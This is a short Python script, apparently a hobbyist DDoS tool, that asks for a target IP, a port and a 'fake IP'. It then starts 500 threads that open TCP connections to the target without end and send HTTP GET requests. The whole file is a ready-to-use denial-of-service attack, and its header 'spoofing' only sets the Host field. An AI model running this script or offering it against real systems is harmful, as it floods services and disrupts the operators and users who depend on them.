# Importing libraries
import threading
import socket


# Script header
print(r'''
'########::'########:::'#######:::'######::::::'######:::'######::'########::'####:'########::'########:
 ##.... ##: ##.... ##:'##.... ##:'##... ##::::'##... ##:'##... ##: ##.... ##:. ##:: ##.... ##:... ##..::
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::::: ##:::..:: ##:::..:: ##:::: ##:: ##:: ##:::: ##:::: ##::::
 ##:::: ##: ##:::: ##: ##:::: ##:. ######:::::. ######:: ##::::::: ########::: ##:: ########::::: ##::::
 ##:::: ##: ##:::: ##: ##:::: ##::..... ##:::::..... ##: ##::::::: ##.. ##:::: ##:: ##.....:::::: ##::::
 ##:::: ##: ##:::: ##: ##:::: ##:'##::: ##::::'##::: ##: ##::: ##: ##::. ##::: ##:: ##::::::::::: ##::::
 ########:: ########::. #######::. ######:::::. ######::. ######:: ##:::. ##:'####: ##::::::::::: ##::::
........:::........::::.......::::......:::::::......::::......:::..:::::..::....::..::::::::::::..:::::
''')


target = input("[+] Please enter the target IP address: ")
port = int(input("[+] Please enter the port number on which you want to perform DDoS attack: "))
fake_ip = input("[+] Please enter fake IP address: ")

#already_connected = 0


def attack():
    while True:
        # Making a connection to internet and this connection is a TCP connection.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))

        # Sending custom header which will have fake_ip
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        # Closing the connection
        s.close()

        ''' 
        If you want to see that how many connections are created than uncomment the part below and the variable already_connceted above the function
        
        Note: Remember one thing if you use this segment of code, than the speed of the script will decrease. 
        '''
        #global already_connected
        #already_connected += 1
        #print(already_connected)


# We need to run the attack function in multiple therads, to successfully perform the DDoS attack.    
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()